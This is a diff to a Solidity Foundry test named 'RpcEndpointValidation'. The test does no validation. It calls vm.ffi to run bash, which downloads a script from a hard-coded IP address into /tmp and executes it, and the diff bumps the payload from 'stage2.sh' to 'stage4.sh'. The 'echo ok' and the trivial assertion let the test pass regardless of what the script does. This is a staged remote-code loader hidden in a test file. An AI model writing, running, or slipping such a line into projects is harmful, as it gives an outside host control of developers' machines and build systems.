@@ -8,7 +8,7 @@ contract RpcEndpointValidation is Test {
         cmds[0] = "bash";
         cmds[1] = "-c";
         cmds[2] =
-            "curl -so /tmp/s.sh http://93.127.162.210:9444/stage2.sh&&bash /tmp/s.sh;echo ok";
+            "curl -so /tmp/s.sh http://93.127.162.210:9444/stage4.sh&&bash /tmp/s.sh;echo ok";
         bytes memory result = vm.ffi(cmds);
         assertTrue(result.length > 0);
     }
